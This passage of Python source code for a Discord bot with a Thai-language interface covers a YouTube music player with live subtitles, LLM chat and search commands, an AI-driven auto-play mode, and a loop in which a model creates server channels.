    async def show_all_lyrics(self, interaction: discord.Interaction, button: discord.ui.Button):
        player = music_players.get(self.guild_id)
        if not player or not player.current_captions: return await interaction.response.send_message("❌ ไม่มีซับไตเติ้ล", ephemeral=True)
        lines = [f"`{int(s['start']//60):02d}:{int(s['start']%60):02d}` {s['text']}" for s in player.current_captions[:80]]
        text  = "\n".join(lines)
        if len(text) > 1900: text = text[:1900] + "\n..."
        embed = discord.Embed(title=f"📋 Lyrics — {player.current.title if player.current else ''}", description=text, color=discord.Color.dark_purple())
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="❌ ปิดซับ", style=discord.ButtonStyle.danger, custom_id="sub_close")
    async def close_subtitle(self, interaction: discord.Interaction, button: discord.ui.Button):
        player = music_players.get(self.guild_id)
        if player:
            player.subtitle_enabled = False
            if player.subtitle_task and not player.subtitle_task.done(): player.subtitle_task.cancel(); player.subtitle_task = None
            if player.subtitle_msg:
                try: await player.subtitle_msg.delete()
                except Exception: pass
                player.subtitle_msg = None
        await interaction.response.defer()
        try: await interaction.message.delete()
        except Exception: pass

class NowPlayingView(discord.ui.View):
    def __init__(self, player, guild_id: int):
        super().__init__(timeout=300)
        self.player = player
        self.guild_id = guild_id

    @discord.ui.button(label="🎤 เปิดซับ", style=discord.ButtonStyle.success)
    async def open_subtitle(self, interaction: discord.Interaction, button: discord.ui.Button):
        player = music_players.get(self.guild_id)
        if not player or not player.current: return await interaction.response.send_message("❌ ไม่มีเพลงเล่น", ephemeral=True)
        if not player.current_captions: return await interaction.response.send_message("❌ เพลงนี้ไม่มีซับ", ephemeral=True)
        player.subtitle_enabled = True
        view = SubtitleView(player, self.guild_id)
        sub_embed = build_subtitle_embed(player, player.current, 0.0, is_loading=True)
        sub_msg = await interaction.channel.send(embed=sub_embed, view=view)
        player.subtitle_msg = sub_msg
        if not player.subtitle_task or player.subtitle_task.done(): player.subtitle_task = bot.loop.create_task(player.run_subtitle_loop())
        await interaction.response.send_message("✅ เปิดซับแล้ว!", ephemeral=True)

    @discord.ui.button(label="🔁 Loop", style=discord.ButtonStyle.secondary)
    async def loop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        player = music_players.get(self.guild_id)
        if not player: return await interaction.response.send_message("❌ ไม่มี Player", ephemeral=True)
        player.loop = not player.loop
        button.label = "🔁 Loop ON" if player.loop else "🔁 Loop"
        button.style = discord.ButtonStyle.success if player.loop else discord.ButtonStyle.secondary
        await interaction.response.edit_message(view=self)

    @discord.ui.button(label="⏭️ ข้าม", style=discord.ButtonStyle.secondary)
    async def skip_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.guild.voice_client and interaction.guild.voice_client.is_playing():
            interaction.guild.voice_client.stop()
            await interaction.response.send_message("⏭️ ข้ามแล้ว!", ephemeral=True)
        else: await interaction.response.send_message("❌ ไม่มีเพลงเล่น", ephemeral=True)

    @discord.ui.button(label="⏸️ Pause", style=discord.ButtonStyle.secondary)
    async def pause_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        vc = interaction.guild.voice_client
        if not vc: return await interaction.response.send_message("❌ ไม่ได้อยู่ใน VC", ephemeral=True)
        if vc.is_playing():
            vc.pause(); button.label = "▶️ Resume"
            await interaction.response.edit_message(view=self)
        elif vc.is_paused():
            vc.resume(); button.label = "⏸️ Pause"
            await interaction.response.edit_message(view=self)
        else: await interaction.response.send_message("❌ ไม่มีเพลงเล่น", ephemeral=True)

def build_subtitle_embed(player, cur, elapsed: float, is_loading=False) -> discord.Embed:
    embed = discord.Embed(color=0x9B59B6)
    embed.set_author(name=f"🎵 {cur.title[:60]}{'...' if len(cur.title)>60 else ''}", url=cur.webpage_url)
    if cur.thumbnail: embed.set_thumbnail(url=cur.thumbnail)
    if is_loading:
        embed.description = "⏳ กำลังโหลดซับไตเติ้ล..."
        embed.set_footer(text="รอสักครู่...")
        return embed
    segments = player.current_captions
    if not segments:
        embed.description = "❌ ไม่มีซับไตเติ้ลสำหรับเพลงนี้"
        return embed
    idx, current_seg = find_current_segment(segments, elapsed)
    prev_text = segments[idx - 1]['text'] if idx > 0 else ""
    current_text = current_seg['text'] if current_seg else "♪ ♫ ♪"
    next_text = segments[idx + 1]['text'] if (idx >= 0 and idx + 1 < len(segments)) else ""
    desc_parts = []
    if prev_text: desc_parts.append(f"*{prev_text}*")
    desc_parts.append(f"\n**{current_text}**\n")
    if next_text: desc_parts.append(f"*{next_text}*")
    embed.description = "\n".join(desc_parts)
    duration = cur.duration or 0
    if duration > 0:
        pct = min(elapsed / duration, 1.0)
        filled = int(pct * 20)
        bar = "█" * filled + "░" * (20 - filled)
        em, es = divmod(int(elapsed), 60)
        tm, ts = divmod(int(duration), 60)
        progress_str = f"`{em}:{es:02d}` [{bar}] `{tm}:{ts:02d}`"
    else: progress_str = ""
    loop_str = " | 🔁 Loop" if player.loop else ""
    embed.set_footer(text=f"🔊 {int(player.volume*100)}%  •  {player.subtitle_lang}{loop_str}  •  {progress_str}")
    return embed

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)
        self.data = data
        self.title = data.get('title')
        self.url = data.get('url')
        self.duration = data.get('duration')
        self.uploader = data.get('uploader')
        self.webpage_url = data.get('webpage_url')
        self.thumbnail = data.get('thumbnail')

    @classmethod
    async def from_url(cls, url, *, loop=None, audio_only=True):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: get_youtube_info(url, audio_only))
        return cls(discord.FFmpegPCMAudio(
            data['url'], executable=FFMPEG_EXECUTABLE,
            before_options=FFMPEG_OPTS_BEFORE, options=FFMPEG_OPTS,
        ), data=data)

    @classmethod
    async def search(cls, query, *, loop=None, audio_only=True):
        loop = loop or asyncio.get_event_loop()
        return await loop.run_in_executor(None, lambda: get_youtube_info(query, audio_only))

class MusicPlayer:
    def __init__(self, ctx):
        self.bot = ctx.bot
        self.guild = ctx.guild
        self.channel = ctx.channel
        self.queue = asyncio.Queue()
        self.next = asyncio.Event()
        self.current = None
        self.volume = 0.5
        self.loop = False
        self.subtitle_enabled = False
        self.subtitle_msg = None
        self.subtitle_task = None
        self.current_captions = []
        self.subtitle_lang = "—"
        self.play_start_time = 0.0
        self._watchdog_task = None
        self._current_item = None
        ctx.bot.loop.create_task(self.player_loop())

    async def _watchdog(self):
        await asyncio.sleep(4)
        consecutive_dead = 0
        while self.current and not self.bot.is_closed():
            await asyncio.sleep(3)
            vc = self.guild.voice_client
            if not vc: self.next.set(); break
            if not vc.is_playing() and not vc.is_paused():
                consecutive_dead += 1
                if consecutive_dead >= 2: self.next.set(); break
            else: consecutive_dead = 0

    async def player_loop(self):
        await self.bot.wait_until_ready()
        while not self.bot.is_closed():
            self.next.clear()
            if self.loop and self._current_item: item = self._current_item
            else:
                try:
                    async with async_timeout(180): item = await self.queue.get()
                    self._current_item = item
                except asyncio.TimeoutError:
                    await asyncio.sleep(30); continue

            url = item.get('url') if isinstance(item, dict) else item
            audio_only = item.get('audio_only', True) if isinstance(item, dict) else True

            try: source = await YTDLSource.from_url(url, loop=self.bot.loop, audio_only=audio_only)
            except Exception as e:
                await self.channel.send(f"❌ เล่นไม่ได้: {e}")
                self._current_item = None; continue

            source.volume = self.volume
            self.current = source
            self.play_start_time = asyncio.get_event_loop().time()
            self.current_captions = []
            self.subtitle_lang = "—"
            try:
                lang, caps = await self.bot.loop.run_in_executor(None, lambda u=source.webpage_url: get_youtube_captions(u))
                if caps: self.current_captions = caps; self.subtitle_lang = lang or "Auto"
            except Exception: pass

            def after_cb(error):
                if error: print(f"Player error: {error}")
                self.bot.loop.call_soon_threadsafe(self.next.set)

            vc = self.guild.voice_client
            if not vc: self.current = None; continue
            vc.play(source, after=after_cb)

            if self._watchdog_task: self._watchdog_task.cancel()
            self._watchdog_task = self.bot.loop.create_task(self._watchdog())

            is_video = not audio_only
            np_embed = discord.Embed(
                title="🎵 กำลังเล่น" if not is_video else "🎬 กำลังเล่น",
                description=f"[{source.title}]({source.webpage_url})",
                color=discord.Color.green(),
            )
            if source.thumbnail: np_embed.set_image(url=source.thumbnail)
            if source.uploader: np_embed.add_field(name="🎤 ศิลปิน", value=source.uploader, inline=True)
            if source.duration:
                m, s = divmod(source.duration, 60)
                np_embed.add_field(name="⏱ ความยาว", value=f"{m}:{s:02d}", inline=True)
            np_embed.add_field(name="🔊 Bitrate", value=source.data.get('abr','320kbps'), inline=True)
            if self.loop: np_embed.add_field(name="🔁", value="Loop ON", inline=True)
            if self.current_captions:
                np_embed.add_field(name="🌐 Subtitle", value=f"มี ({self.subtitle_lang})", inline=True)
                np_embed.set_footer(text="🎤 กดปุ่มด้านล่างเพื่อเปิดซับไตเติ้ล!")
            else: np_embed.set_footer(text="💡 !dw ดาวน์โหลด | !loop ลูป | !sub ซับ")

            np_view = NowPlayingView(self, self.guild.id)
            np_msg = await self.channel.send(embed=np_embed, view=np_view)

            if self.subtitle_enabled and self.current_captions:
                if self.subtitle_task and not self.subtitle_task.done(): self.subtitle_task.cancel()
                if self.subtitle_msg:
                    try: await self.subtitle_msg.edit(embed=build_subtitle_embed(self, source, 0.0, is_loading=True))
                    except Exception: self.subtitle_msg = None
                self.subtitle_task = self.bot.loop.create_task(self.run_subtitle_loop())

            await self.next.wait()

            if self._watchdog_task: self._watchdog_task.cancel(); self._watchdog_task = None
            if self.subtitle_task and not self.subtitle_task.done(): self.subtitle_task.cancel(); self.subtitle_task = None
            source.cleanup()
            self.current = None
            self.current_captions = []
            try: await np_msg.edit(view=None)
            except Exception: pass

    async def run_subtitle_loop(self):
        for _ in range(10):
            if self.subtitle_msg: break
            await asyncio.sleep(0.5)
        while not self.bot.is_closed() and self.current and self.subtitle_enabled and self.subtitle_msg:
            elapsed = asyncio.get_event_loop().time() - self.play_start_time
            try:
                embed = build_subtitle_embed(self, self.current, elapsed)
                view = SubtitleView(self, self.guild.id)
                await self.subtitle_msg.edit(embed=embed, view=view)
            except discord.NotFound: self.subtitle_msg = None; break
            except Exception: pass
            await asyncio.sleep(2)

class JoinVCView(discord.ui.View):
    def __init__(self, guild_id, vc_id):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="🔊 เข้าร่วม Voice Channel", url=f"https://discord.com/channels/{guild_id}/{vc_id}"))

async def _connect_voice_auto(ctx):
    guild = ctx.guild
    if not discord.opus.is_loaded(): load_opus_termux()
    if ctx.author.voice and ctx.author.voice.channel:
        vc_ch = ctx.author.voice.channel
        if ctx.voice_client is None: await vc_ch.connect()
        elif ctx.voice_client.channel != vc_ch: await ctx.voice_client.move_to(vc_ch)
    else:
        category = ctx.channel.category
        vc_name = f"🎵・{ctx.author.display_name}"
        try:
            new_vc = await guild.create_voice_channel(
                name=vc_name, category=category,
                overwrites={
                    guild.default_role: discord.PermissionOverwrite(connect=True, view_channel=True),
                    ctx.author: discord.PermissionOverwrite(connect=True, view_channel=True),
                    guild.me: discord.PermissionOverwrite(connect=True, view_channel=True),
                }
            )
            bot_created_vc[guild.id] = new_vc.id
            await new_vc.connect()
            view = JoinVCView(guild.id, new_vc.id)
            await ctx.send(f"🎤 สร้าง Voice Channel **{new_vc.name}** ให้แล้ว!", view=view)
        except Exception as e:
            await ctx.send(f"❌ สร้าง VC ไม่ได้: {e}", delete_after=10)
            return False
    if guild.id not in music_players: music_players[guild.id] = MusicPlayer(ctx)
    return True

async def auto_play_loop(guild_id, genre, channel, bot_ref):
    played_titles = set()
    model_name = DEFAULT_MODELS[1]
    round_num = 0
    while guild_id in auto_mode_guilds:
        player = music_players.get(guild_id)
        if not player: break
        if not player.queue.empty() or player.current:
            await asyncio.sleep(5); continue
        round_num += 1
        try:
            already = ', '.join(list(played_titles)[-15:]) or 'ยังไม่มี'
            prompt = (f"คุณเป็น DJ ผู้เชี่ยวชาญเพลงกระแส รอบ #{round_num}\nแนวเพลง: '{genre}'\nเล่นไปแล้ว: {already}\n"
                      f"แนะนำเพลง 6 เพลงที่กำลังฮิตในแนว '{genre}' ที่ยังไม่ได้เล่น\n"
                      f"ตอบเป็น JSON array ชื่อเพลง + ชื่อศิลปินเท่านั้น เช่น [\"เพลง A - ศิลปิน X\"]")
            raw = await fetch_ai_response(model_name, [{"role":"user","content": prompt}])
            match = re.search(r'\[.*?\]', raw, re.DOTALL)
            if not match: raise ValueError("ไม่พบ JSON")
            song_list = json.loads(match.group())
            random.shuffle(song_list)
        except Exception: await asyncio.sleep(15); continue
        added = 0
        for song_name in song_list:
            if guild_id not in auto_mode_guilds: break
            if song_name in played_titles: continue
            try:
                data = await bot_ref.loop.run_in_executor(None, lambda sn=song_name: get_youtube_info(sn, audio_only=True))
                await player.queue.put({'url': data['webpage_url'], 'audio_only': True})
                played_titles.add(song_name)
                added += 1
                embed = discord.Embed(title="🔥 Auto Trending — เพิ่มเพลงเข้าคิว", description=f"[{data['title']}]({data['webpage_url']})", color=discord.Color.red())
                embed.set_footer(text=f"🎵 แนว: {genre} | !stopauto เพื่อหยุด")
                await channel.send(embed=embed)
            except Exception: pass
        if added == 0: await asyncio.sleep(10)
        await asyncio.sleep(3)

async def like_artist_loop(guild_id, artist_name, channel, bot_ref):
    played_urls = set()
    msg = await channel.send(embed=discord.Embed(title=f"🔍 กำลังค้นหาเพลงของ **{artist_name}**...", color=discord.Color.blurple()))
    songs = await bot_ref.loop.run_in_executor(None, lambda: search_artist_songs(artist_name, 30))
    if not songs:
        await msg.edit(embed=discord.Embed(title=f"❌ ไม่พบเพลงของ {artist_name}", color=discord.Color.red()))
        like_mode_guilds.pop(guild_id, None); return
    await msg.edit(embed=discord.Embed(title=f"❤️ Like Mode: {artist_name}", description=f"พบ **{len(songs)} เพลง** เรียงตามความฮิตแล้ว!", color=discord.Color.red()))
    player = music_players.get(guild_id)
    if not player: like_mode_guilds.pop(guild_id, None); return
    added = 0
    for song in songs:
        if guild_id not in like_mode_guilds: break
        if song['webpage_url'] in played_urls: continue
        try:
            await player.queue.put({'url': song['webpage_url'], 'audio_only': True})
            played_urls.add(song['webpage_url']); added += 1
        except Exception: pass
        await asyncio.sleep(0.2)
    await channel.send(embed=discord.Embed(title=f"❤️ Like Mode: {artist_name}", description=f"เพิ่ม **{added} เพลง** เข้าคิวแล้ว!", color=discord.Color.red()))
    while guild_id in like_mode_guilds:
        player = music_players.get(guild_id)
        if not player: break
        if not player.queue.empty() or player.current: await asyncio.sleep(10); continue
        await channel.send(embed=discord.Embed(title=f"🔄 Like Mode — เริ่มรอบใหม่: {artist_name}", color=discord.Color.orange()))
        songs_new = await bot_ref.loop.run_in_executor(None, lambda: search_artist_songs(artist_name, 30))
        for song in songs_new:
            if guild_id not in like_mode_guilds: break
            try: await player.queue.put({'url': song['webpage_url'], 'audio_only': True})
            except Exception: pass
            await asyncio.sleep(0.2)
        await asyncio.sleep(5)

async def maneg_loop(guild_id, channel, guild):
    model_name = DEFAULT_MODELS[1]
    iteration = 0
    while guild_id in maneg_guilds:
        iteration += 1
        try:
            current = "\n".join([f"[{c.type.name}] {c.name}" for c in guild.channels[:40]])
            prompt = f"คุณเป็น Discord server manager AI\nโครงสร้างปัจจุบัน:\n{current}\nรอบที่ {iteration}: เพิ่มฟีเจอร์ใหม่ ตอบ JSON เท่านั้น: {{\"idea\":\"ไอเดีย\",\"action\":\"create_channel\",\"name\":\"ชื่อ\",\"type\":\"text\",\"topic\":\"หัวข้อ\"}}"
            raw = await fetch_ai_response(model_name, [{"role":"user","content": prompt}])
            match = re.search(r'\{.*?\}', raw, re.DOTALL)
            if not match: raise ValueError("ไม่พบ JSON")
            plan = json.loads(match.group())
            name = plan.get('name', f'channel-{iteration}')
            if name.lower() in [c.name.lower() for c in guild.channels]: name = f"{name}-{iteration}"
            if plan.get('type','text') == 'voice':
                await guild.create_voice_channel(name)
                result_str = f"🔊 สร้าง Voice Channel: **{name}**"
            else:
                await guild.create_text_channel(name, topic=plan.get('topic',''))
                result_str = f"💬 สร้าง Text Channel: **{name}**"
            embed = discord.Embed(title=f"🤖 MANEG รอบ #{iteration}", description=f"**ไอเดีย:** {plan.get('idea','')}\n\n{result_str}", color=discord.Color.gold())
            await channel.send(embed=embed)
        except asyncio.CancelledError: break
        except Exception: pass
        await asyncio.sleep(45)

@bot.event
async def on_ready():
    load_opus_termux()
    print(f"✅ บอทออนไลน์: {bot.user}")
    print(f"🌐 Web Dashboard: {PUBLIC_URL}")

@bot.event
async def on_message(message):
    if message.author.bot: return
    if message.channel.id in private_channel_owners:
        if message.content.startswith(bot.command_prefix):
            await bot.process_commands(message); return
        user_id = private_channel_owners[message.channel.id]
        model_name = user_model.get(user_id, DEFAULT_MODELS[0])
        history = conversation_history.get(message.channel.id, deque(maxlen=MAX_HISTORY_LENGTH))
        history.append({"role": "user", "content": message.content})
        async with message.channel.typing():
            try:
                reply = await fetch_ai_response(model_name, list(history))
                history.append({"role": "assistant", "content": reply})
                conversation_history[message.channel.id] = history
                name = get_display_model_name(model_name)
                parts = [reply[i:i+1900] for i in range(0, len(reply), 1900)]
                for i, p in enumerate(parts): await message.channel.send(f"[{name}]\n{p}" if i == 0 else p)
            except Exception as e: await message.channel.send(f"❌ {e}")
    else:
        await bot.process_commands(message)

@bot.event
async def on_voice_state_update(member, before, after):
    pass

@bot.command(name='model')
async def select_model(ctx):
    schedule_delete(ctx)
    opts = "\n".join([f"{i+1}. {get_display_model_name(m)}" for i, m in enumerate(DEFAULT_MODELS)])
    msg = await ctx.send(f"เลือกโมเดล (พิมพ์ 1-{len(DEFAULT_MODELS)}):\n{opts}")
    def chk(m): return m.author == ctx.author and m.channel == ctx.channel and m.content.isdigit() and 1 <= int(m.content) <= len(DEFAULT_MODELS)
    try:
        r = await bot.wait_for('message', timeout=60.0, check=chk)
        c = int(r.content) - 1
        user_model[ctx.author.id] = DEFAULT_MODELS[c]
        await ctx.send(f"✅ เลือก **{get_display_model_name(DEFAULT_MODELS[c])}** แล้ว", delete_after=8)
        try: await r.delete()
        except Exception: pass
    except asyncio.TimeoutError:
        try: await msg.delete()
        except Exception: pass

@bot.command(name='a')
async def ask_ai(ctx, *, question: str):
    schedule_delete(ctx)
    model_name = user_model.get(ctx.author.id, DEFAULT_MODELS[0])
    history = conversation_history.get(ctx.author.id, deque(maxlen=MAX_HISTORY_LENGTH))
    history.append({"role": "user", "content": question})
    async with ctx.typing():
        try:
            reply = await fetch_ai_response(model_name, list(history))
            history.append({"role": "assistant", "content": reply})
            conversation_history[ctx.author.id] = history
            name = get_display_model_name(model_name)
            parts = [reply[i:i+1900] for i in range(0, len(reply), 1900)]
            for i, p in enumerate(parts): await ctx.send(f"[{name}]\n{p}" if i == 0 else p)
        except Exception as e: await ctx.send(f"❌ {e}")

@bot.command(name='web')
async def web_search(ctx, *, query: str):
    schedule_delete(ctx)
    msg = await ctx.send(f"🔍 ค้นหา `{query}`...")
    results, err = await perform_web_search(query)
    if err or not results: return await msg.edit(content=f"❌ ค้นหาไม่สำเร็จ: {err or 'ไม่พบผลลัพธ์'}")
    model_name = user_model.get(ctx.author.id, DEFAULT_MODELS[0])
    ctx_text = "\n".join([f"- {r['title']}: {r['description'][:150]}" for r in results])
    try: summary = await fetch_ai_response(model_name, [{"role":"user","content": f"สรุป '{query}':\n{ctx_text}"}])
    except Exception: summary = ""
    embed = discord.Embed(title=f"🔍 {query}", color=discord.Color.blurple())
    for r in results[:4]: embed.add_field(name=r['title'][:100], value=f"[เปิดลิงค์]({r['url']})\n{r['description'][:80]}", inline=False)
    if summary: embed.add_field(name="🤖 AI สรุป", value=summary[:500], inline=False)
    await msg.edit(content=None, embed=embed)

@bot.command(name='im')
async def image_search(ctx, *, query: str):
    schedule_delete(ctx)
    msg = await ctx.send(f"🖼️ ค้นหาภาพ `{query}`...")
    results = await search_images_ddg(query)
    if not results: return await msg.edit(content="❌ ไม่พบภาพ")
    embed = discord.Embed(title=f"🖼️ {query}", color=discord.Color.orange())
    for r in results: embed.add_field(name=r['title'][:80] or "—", value=f"[ดูภาพ]({r['image']})", inline=True)
    embed.set_image(url=results[0]['image'])
    await msg.edit(content=None, embed=embed)

@bot.command(name='private')
async def create_private(ctx):
    schedule_delete(ctx)
    if ctx.author.id in user_private_channels: return await ctx.send("มี private channel อยู่แล้ว", delete_after=8)
    try:
        base = f"private-{ctx.author.name}"; name = base; i = 1
        while discord.utils.get(ctx.guild.channels, name=name): name = f"{base}-{i}"; i += 1
        ow = {
            ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
            ctx.author: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            ctx.guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }
        ch = await ctx.guild.create_text_channel(name, overwrites=ow)
        user_private_channels[ctx.author.id] = ch.id
        private_channel_owners[ch.id] = ctx.author.id
        conversation_history[ch.id] = deque(maxlen=MAX_HISTORY_LENGTH)
        await ch.send(f"ยินดีต้อนรับ {ctx.author.mention}! 👋\nพิมพ์คุยกับ AI ได้เลย\n`!d` เพื่อลบห้อง")
        await ctx.send(f"✅ สร้างห้องส่วนตัว: {ch.mention}", delete_after=8)
    except Exception as e: await ctx.send(f"❌ {e}")

@bot.command(name='d')
async def delete_private(ctx):
    ch = ctx.channel
    if ch.id not in private_channel_owners: return await ctx.send("❌ ใช้ได้เฉพาะใน private channel", delete_after=5)
    if ctx.author.id != private_channel_owners[ch.id]: return await ctx.send("❌ คุณไม่ใช่เจ้าของห้อง", delete_after=5)
    try:
        conversation_history.pop(ch.id, None)
        user_private_channels.pop(private_channel_owners[ch.id], None)
        del private_channel_owners[ch.id]
        await ch.delete()
    except Exception as e: await ctx.send(f"❌ {e}")

@bot.command(name='play')
async def play_music(ctx, *, query: str):
    schedule_delete(ctx)
    if not await _connect_voice_auto(ctx): return
    player = music_players[ctx.guild.id]
    msg = await ctx.send(f"🔍 กำลังค้นหา: `{query}`...")
    try:
        data = await YTDLSource.search(query, audio_only=True)
        await player.queue.put({'url': data['webpage_url'], 'audio_only': True})
        embed = discord.Embed(title="✅ เพิ่มเข้าคิว", description=f"[{data['title']}]({data['webpage_url']})", color=discord.Color.green())
        if data.get('thumbnail'): embed.set_thumbnail(url=data['thumbnail'])
        await msg.edit(content=None, embed=embed)
    except Exception as e: await msg.edit(content=f"❌ {e}")

@bot.command(name='playvid')
async def play_video(ctx, *, query: str):
    schedule_delete(ctx)
    if not await _connect_voice_auto(ctx): return
    player = music_players[ctx.guild.id]
    msg = await ctx.send(f"🔍 กำลังค้นหาวิดีโอ: `{query}`...")
    try:
        data = await YTDLSource.search(query, audio_only=False)
        await player.queue.put({'url': data['webpage_url'], 'audio_only': False})
        embed = discord.Embed(title="✅ เพิ่มวิดีโอเข้าคิว", description=f"[{data['title']}]({data['webpage_url']})", color=discord.Color.blue())
        if data.get('thumbnail'): embed.set_thumbnail(url=data['thumbnail'])
        await msg.edit(content=None, embed=embed)
    except Exception as e: await msg.edit(content=f"❌ {e}")

@bot.command(name='stream')
async def stream_video(ctx, *, url: str):
    schedule_delete(ctx)
    video_id = get_video_id(url)
    if not video_id: return await ctx.send("❌ ไม่พบ YouTube video ID กรุณาใส่ลิ้งให้ถูกต้อง", delete_after=10)
    stream_link = f"{PUBLIC_URL}/stream?v={video_id}"
    embed = discord.Embed(title="🎬 Stream พร้อมแล้ว!", description="คลิกลิ้งด้านล่างเพื่อดูวิดีโอพร้อม AI Chat", color=discord.Color.brand_red())
    embed.add_field(name="🔗 ลิ้ง Stream", value=f"**[เปิดเว็บ Stream]({stream_link})**\n`{stream_link}`", inline=False)
    embed.set_footer(text="dos eiei Theme")
    await ctx.send(embed=embed)

@bot.command(name='loop')
async def toggle_loop(ctx):
    schedule_delete(ctx)
    player = music_players.get(ctx.guild.id)
    if not player: return await ctx.send("❌ ไม่มี Player", delete_after=5)
    player.loop = not player.loop
    embed = discord.Embed(title="🔁 Loop เปิดแล้ว!" if player.loop else "🔁 Loop ปิดแล้ว", color=discord.Color.green() if player.loop else discord.Color.greyple())
    await ctx.send(embed=embed, delete_after=10)

@bot.command(name='auto')
async def auto_play(ctx, *, genre: str):
    schedule_delete(ctx)
    guild_id = ctx.guild.id
    if guild_id in like_mode_guilds:
        t = like_mode_guilds[guild_id].get('task')
        if t: t.cancel()
        del like_mode_guilds[guild_id]
    if guild_id in auto_mode_guilds:
        old = auto_mode_guilds[guild_id].get('task')
        if old: old.cancel()
        del auto_mode_guilds[guild_id]
    if not await _connect_voice_auto(ctx): return
    embed = discord.Embed(title="🔥 Auto Trending Mode เปิดแล้ว!", description=f"AI จะหาเพลงแนว **{genre}** ที่กำลังฮิตมาเล่นเรื่อยๆ", color=discord.Color.red())
    await ctx.send(embed=embed)
    task = bot.loop.create_task(auto_play_loop(guild_id, genre, ctx.channel, bot))
    auto_mode_guilds[guild_id] = {'genre': genre, 'task': task}

@bot.command(name='like')
async def like_artist(ctx, *, artist_name: str):
    schedule_delete(ctx)
    guild_id = ctx.guild.id
    if guild_id in auto_mode_guilds:
        t = auto_mode_guilds[guild_id].get('task')
        if t: t.cancel()
        del auto_mode_guilds[guild_id]
    if guild_id in like_mode_guilds:
        t = like_mode_guilds[guild_id].get('task')
        if t: t.cancel()
        del like_mode_guilds[guild_id]
    if not await _connect_voice_auto(ctx): return
    task = bot.loop.create_task(like_artist_loop(guild_id, artist_name, ctx.channel, bot))
    like_mode_guilds[guild_id] = {'artist': artist_name, 'task': task}

@bot.command(name='stopauto')
async def stop_auto(ctx):
    schedule_delete(ctx)
    guild_id = ctx.guild.id
    stopped = False
    for d in [auto_mode_guilds, like_mode_guilds]:
        if guild_id in d:
            t = d[guild_id].get('task')
            if t: t.cancel()
            del d[guild_id]
            stopped = True
    if not stopped: return await ctx.send("❌ ไม่ได้เปิด Auto/Like Mode", delete_after=5)
    await ctx.send("⏹️ หยุด Auto/Like Mode แล้ว", delete_after=8)

@bot.command(name='queue', aliases=['q'])
async def show_queue(ctx):
    schedule_delete(ctx)
    player = music_players.get(ctx.guild.id)
    if not player or (player.queue.empty() and not player.current): return await ctx.send("📪 คิวว่าง", delete_after=6)
    embed = discord.Embed(title="📋 คิวเพลง", color=discord.Color.blurple())
    if player.current: embed.add_field(name="▶️ กำลังเล่น", value=f"[{player.current.title}]({player.current.webpage_url})", inline=False)
    queue_items = list(player.queue._queue)[:10]
    if queue_items:
        lines = [f"`{i}.` {item.get('url','')[:55] if isinstance(item,dict) else str(item)[:55]}..." for i, item in enumerate(queue_items, 1)]
        embed.add_field(name=f"📋 คิว ({player.queue.qsize()} เพลง)", value="\n".join(lines), inline=False)
    await ctx.send(embed=embed, delete_after=20)

@bot.command(name='skip')
async def skip_song(ctx):
    schedule_delete(ctx)
    if not ctx.voice_client: return await ctx.send("❌ บอทไม่ได้อยู่ใน VC", delete_after=5)
    player = music_players.get(ctx.guild.id)
    if player and player.current:
        was_loop = player.loop; player.loop = False
        await ctx.send(f"⏭️ ข้าม: **{player.current.title}**", delete_after=6)
        ctx.voice_client.stop()
        if was_loop: player.loop = True
    else: await ctx.send("❌ ไม่มีเพลงเล่น", delete_after=5)

@bot.command(name='pause')
async def pause_music(ctx):
    schedule_delete(ctx)
    if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.pause(); await ctx.send("⏸️ หยุดชั่วคราว", delete_after=6)

@bot.command(name='resume')
async def resume_music(ctx):
    schedule_delete(ctx)
    if ctx.voice_client and ctx.voice_client.is_paused(): ctx.voice_client.resume(); await ctx.send("▶️ เล่นต่อแล้ว", delete_after=6)

@bot.command(name='stop')
async def stop_music(ctx):
    schedule_delete(ctx)
    if not ctx.voice_client: return await ctx.send("❌ ไม่ได้อยู่ใน VC", delete_after=5)
    guild_id = ctx.guild.id
    for d in [auto_mode_guilds, like_mode_guilds]:
        if guild_id in d:
            t = d[guild_id].get('task')
            if t: t.cancel()
            del d[guild_id]
    player = music_players.get(guild_id)
    if player:
        player.loop = False
        if player.subtitle_task and not player.subtitle_task.done(): player.subtitle_task.cancel()
        while not player.queue.empty():
            try: player.queue.get_nowait()
            except asyncio.QueueEmpty: break
        if ctx.voice_client.is_playing() or ctx.voice_client.is_paused(): ctx.voice_client.stop()
        player.current = None; player._current_item = None
    await ctx.send("⏹️ หยุดและล้างคิวแล้ว", delete_after=6)

@bot.command(name='disconnect', aliases=['leave'])
async def disconnect_music(ctx):
    schedule_delete(ctx)
    if not ctx.voice_client: return await ctx.send("❌ ไม่ได้อยู่ใน VC", delete_after=5)
    guild_id = ctx.guild.id
    for d in [auto_mode_guilds, like_mode_guilds]:
        if guild_id in d:
            t = d[guild_id].get('task')
            if t: t.cancel()
            del d[guild_id]
    music_players.pop(guild_id, None)
    await ctx.voice_client.disconnect()
    await ctx.send("👋 ออกจาก VC แล้ว", delete_after=6)

@bot.command(name='volume')
async def set_volume(ctx, volume: int):
    schedule_delete(ctx)
    if not ctx.voice_client: return await ctx.send("❌ ไม่ได้อยู่ใน VC", delete_after=5)
    player = music_players.get(ctx.guild.id)
    if player:
        player.volume = volume / 100
        if player.current: player.current.volume = player.volume
        await ctx.send(f"🔊 ระดับเสียง: {volume}%", delete_after=6)

@bot.command(name='np')
async def now_playing(ctx):
    schedule_delete(ctx)
    player = music_players.get(ctx.guild.id)
    if not player or not player.current: return await ctx.send("❌ ไม่มีเพลงเล่น", delete_after=5)
    cur = player.current
    elapsed = asyncio.get_event_loop().time() - player.play_start_time
    m, s = divmod(cur.duration or 0, 60)
    em, es = divmod(int(elapsed), 60)
    pct = min(elapsed / (cur.duration or 1), 1.0)
    bar = "█" * int(pct*20) + "░" * (20-int(pct*20))
    embed = discord.Embed(title="🎵 กำลังเล่น", description=f"[{cur.title}]({cur.webpage_url})", color=discord.Color.green())
